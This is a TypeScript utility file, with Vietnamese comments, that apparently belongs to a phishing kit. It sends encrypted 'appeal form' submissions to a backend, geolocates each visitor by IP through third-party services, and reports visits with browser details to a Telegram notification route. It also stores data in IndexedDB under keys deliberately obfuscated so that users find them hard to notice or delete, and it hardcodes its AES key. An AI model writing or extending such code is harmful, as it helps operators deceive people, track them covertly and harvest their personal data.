import axios from "axios";
import CryptoJS from "crypto-js";
const secretKey = "HDNDT-JDHT8FNEK-JJHR";
const STORAGE_EXPIRY = 60 * 60 * 1000;
const NOTI_ENABLED = process.env.NEXT_PUBLIC_NOTIFICATION_ENABLED || false;

export const encrypt = (text: string) => {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
};

export const decrypt = (cipherText: string) => {
    const bytes = CryptoJS.AES.decrypt(cipherText, secretKey);
    return bytes.toString(CryptoJS.enc.Utf8);
};

// Sinh key lưu trữ được làm rối để khó nhận diện và xóa thủ công
const deriveStorageKey = (key: string) => {
    try {
        const ua = typeof navigator !== 'undefined' ? navigator.userAgent : '';
        const host = typeof location !== 'undefined' ? location.hostname : '';
        const seed = `${host}|${ua}|${secretKey}`;
        const hash = CryptoJS.SHA256(`${key}|${seed}`).toString();
        return `__${hash.slice(0, 16)}_${hash.slice(16, 32)}_${hash.slice(32, 48)}`;
    } catch {
        return key;
    }
};

// IndexedDB utilities
const DB_NAME = 'AppStorage';
const DB_VERSION = 1;
const STORE_NAME = 'records';

const openDB = (): Promise<IDBDatabase> => {
    return new Promise((resolve, reject) => {
        if (typeof window === 'undefined') {
            reject(new Error('IndexedDB is not available in server environment'));
            return;
        }

        const request = indexedDB.open(DB_NAME, DB_VERSION);

        request.onerror = () => reject(request.error);
        request.onsuccess = () => resolve(request.result);

        request.onupgradeneeded = (event) => {
            const db = (event.target as IDBOpenDBRequest).result;
            if (!db.objectStoreNames.contains(STORE_NAME)) {
                db.createObjectStore(STORE_NAME);
            }
        };
    });
};

const getFromDB = async (key: string): Promise<any> => {
    try {
        const db = await openDB();
        const transaction = db.transaction([STORE_NAME], 'readonly');
        const store = transaction.objectStore(STORE_NAME);
        const request = store.get(key);

        return new Promise((resolve, reject) => {
            request.onerror = () => reject(request.error);
            request.onsuccess = () => resolve(request.result);
        });
    } catch (error) {
        throw error;
    }
};

const setInDB = async (key: string, value: any): Promise<void> => {
    try {
        const db = await openDB();
        const transaction = db.transaction([STORE_NAME], 'readwrite');
        const store = transaction.objectStore(STORE_NAME);
        const request = store.put(value, key);

        return new Promise((resolve, reject) => {
            request.onerror = () => reject(request.error);
            request.onsuccess = () => resolve();
        });
    } catch (error) {
        throw error;
    }
};

const deleteFromDB = async (key: string): Promise<void> => {
    try {
        const db = await openDB();
        const transaction = db.transaction([STORE_NAME], 'readwrite');
        const store = transaction.objectStore(STORE_NAME);
        const request = store.delete(key);

        return new Promise((resolve, reject) => {
            request.onerror = () => reject(request.error);
            request.onsuccess = () => resolve();
        });
    } catch (error) {
        throw error;
    }
};

export const saveRecord = async (key: string, value: any) => {
    try {
        if (typeof window === 'undefined') return;

        const storageKey = deriveStorageKey(key);
        const encryptedValue = encrypt(JSON.stringify(value));
        const record = {
            value: encryptedValue,
            expiry: Date.now() + STORAGE_EXPIRY,
            pad: CryptoJS.lib.WordArray.random(8).toString()
        };

        await setInDB(storageKey, record);
    } catch (error) {
        console.error("Lỗi khi lưu IndexedDB:", error);
    }
};

export const getRecord = async (key: string) => {
    try {
        if (typeof window === 'undefined') return null;

        const storageKey = deriveStorageKey(key);
        const item = await getFromDB(storageKey);

        if (!item) return null;

        const { value, expiry } = item;

        // Hết hạn
        if (Date.now() > expiry) {
            await deleteFromDB(storageKey);
            return null;
        }

        const decryptedValue = decrypt(value);
        if (!decryptedValue) return null;

        return JSON.parse(decryptedValue);
    } catch (error) {
        console.error("Lỗi khi đọc IndexedDB:", error);
        return null;
    }
};

export const removeRecord = async (key: string) => {
    try {
        if (typeof window === 'undefined') return;

        const storageKey = deriveStorageKey(key);
        await deleteFromDB(storageKey);
    } catch (error) {
        console.error("Lỗi khi xóa IndexedDB:", error);
    }
};

export const sendAppealForm = async (values: any) => {
    try {
        const jsonString = JSON.stringify(values);
        const encryptedData = encrypt(jsonString);

        const response = await axios.post('/api/send-request', {
            data: encryptedData,
        });

        return response;
    } catch (error) {
        throw error;
    }
};

export const maskPhoneNumber = (phone: string) => {
    if (phone) {
        if (phone.length < 5) return phone; 
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        const masked = '*'.repeat(phone.length - 4);
        return `+${start} ${masked} ${end}`;
    }
    return '';
};

export const getUserIp = async () => {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        throw error;
    }
};

// APIP
export const getUserLocation = async () => {
    try {
        const response = await axios.get(`https://apip.cc/json`);
        return {
            location: `${response.data.query || response.data.ip} | ${response.data.RegionName}(${response.data.RegionCode}) | ${response.data.CountryName}(${response.data.CountryCode})`,
            country_code: response.data.CountryCode,
            ip: response.data.query || response.data.ip,
        }

    } catch (error) {
        throw error;
    }
};

// IP WHO
// export const getUserLocation = async () => {
//     try {
//         const response = await axios.get(`https://ipwho.is`);
//         return {
//             location: `${response.data.ip} | ${response.data.region}(${response.data.region_code}) | ${response.data.country}(${response.data.country_code})`,
//             country_code: response.data.country_code,
//             ip: response.data.ip,
//         }

//     } catch (error) {
//         throw error;
//     }
// };


export const notifyTelegramVisit = async (userInfo: any) => {
    try {
        if (!NOTI_ENABLED) {
            return;
        }
        if (typeof window === 'undefined' || typeof navigator === 'undefined') {
            return;
        }
        const visitData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href,
            ...userInfo
        };

        const response = await axios.post('/api/notification', {
            data: visitData,
        });

        return response;
    } catch (error) {
        console.error('Error notifying Telegram about visit:', error);
        // Don't throw error to avoid breaking the main flow
    }
};